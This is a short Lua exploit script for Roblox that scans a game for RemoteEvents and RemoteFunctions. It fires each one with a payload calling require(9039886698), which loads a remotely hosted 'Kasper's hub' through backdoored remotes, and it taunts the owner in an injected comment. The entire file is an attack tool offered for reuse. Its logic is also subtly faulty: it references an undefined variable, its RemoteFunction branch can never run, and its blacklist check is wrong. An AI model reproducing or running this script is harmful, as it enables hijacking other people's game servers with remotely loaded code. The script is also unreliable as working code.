--[[
backdoorscanner.lua
This will search for random located RemoteEvents/RemoteFunctions that handles Require Script execution code and inject Kasper's hub into it.
Bitwise#4908
]]
local RemoteFunctionsEnabled = false -- Change to true if you want to Invoke RemoteFunctions. (Might sometimes work)
local Code = "require(9039886698).tristytn('" .. game.Players.LocalPlayer.Name .. "')" -- This will load the Kasper's Hub but if you know how to change this feel free to.
local Blacklisted = {"emma", "__FUNCTION"}
for i, v in pairs(game:GetDescendants()) do
    if v:IsA("RemoteEvent") then
        for index, value in pairs(Blacklisted) do
            if v.Name ~= value then
                local CodeSetup =
                    "--[[ Hey, " ..
                    v:GetFullName() ..
                        " nice " ..
                            typeof(v) ..
                                " you got there! Unfortunately, I already injected into your " ..
                                    v:GetFullName() .. "]] \n" .. Code
                v:FireServer(CodeSetup)
            end
        end
        if RemoteFunctionsEnabled then
        elseif v:IsA("RemoteFunction") then
            for index, value in pairs(blacklisted) do
                if v.Name ~= value then
                    local CodeSetup =
                        "--[[ Hey, " ..
                        v:GetFullName() ..
                            " nice " ..
                                typeof(v) ..
                                    " you got there! Unfortunately, I already injected into your " ..
                                        v:GetFullName() .. "]] \n" .. Code
                    v:InvokeServer(CodeSetup)
                end
            end
        end
    end
end
